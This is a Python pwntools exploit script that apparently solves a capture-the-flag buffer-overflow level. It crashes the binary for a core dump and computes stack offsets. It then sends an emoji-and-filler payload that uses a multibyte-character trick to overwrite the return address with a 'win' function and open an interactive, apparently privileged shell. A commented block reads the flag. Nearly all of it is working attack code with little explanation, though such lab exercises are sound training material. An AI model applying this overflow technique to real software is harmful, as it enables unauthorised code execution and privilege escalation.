# SETUP BOILERPLATE
from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level09') # replace this with the actual level
get_a_shell = p64(elf.symbols["win"])

# crash the process to get a core file and find the buffer address (still boilerplate)

emojis = '😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶'

io = elf.process(env={}, setuid=False)
io.sendline(emojis.encode('utf8'))
io.wait()
core = io.corefile
# buffer_address = core.stack.find(emojis.encode('utf8'))
os.unlink(core.path) # delete the file now that we're done with it


# # launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript='''
    b *0x40087b
    continue
    ''')
else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
buffer_addr = 0x7fffffffed88 - 255
ret_addr = 0x7fffffffed28


num_emoji_bytes = ret_addr - buffer_addr - 4 - 4 # guesss and check offsets
emoji_payload = b""
for i, _ in enumerate(emojis):
    emoji_bytes = emojis[i].encode()
    if len(emoji_payload) + len(emoji_bytes) < num_emoji_bytes:
       emoji_payload += emoji_bytes


print(emoji_payload.decode('utf8'))


emoji_filler = bytes([ord('A') + i for i in range(0, num_emoji_bytes - len(emoji_payload))])

# C290 is valid mblen where 90 is not so we smuggle and offset
payload = emoji_payload + emoji_filler + b"\xC2\x90\x21\x40"
print(payload.decode('utf8', errors='replace'))
io.sendline(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
